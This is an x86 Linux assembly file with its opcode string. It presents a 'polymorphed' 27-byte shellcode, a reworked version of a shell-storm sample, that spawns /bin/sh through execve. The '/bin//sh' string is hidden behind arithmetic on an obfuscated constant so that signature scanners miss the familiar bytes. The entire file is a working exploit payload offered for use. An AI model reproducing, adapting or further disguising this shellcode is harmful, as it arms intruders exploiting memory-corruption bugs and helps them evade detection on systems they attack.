; Polymorphed version of shellcode-575.php from shell-storm
; Author: Danijel Ilisin / @dab00ze
; http://dilsec.com
;
; Nothing fancy, just obfuscating the string
;
; new shellcode: "\x6a\x0b\x58\x99\x52\xbb\x2e\x2f\x73\x68\x8d\x4b\x01\x51\x8d\x8b"
;                "\x01\x33\xf6\x05\x51\x89\xe3\x31\xc9\xcd\x80" 
;
; that's 27 bytes (129% size of the original shellcode)

global _start			

section .text
_start:

    push    byte 0xb
    pop     eax
    cdq
    push    edx
    mov     ebx, 0x68732f2e
    lea     ecx, [ebx+1]
    push    ecx
    lea     ecx, [ebx+0x5F63300+1]
    push    ecx    
    mov     ebx, esp
    xor     ecx, ecx
    int     0x80

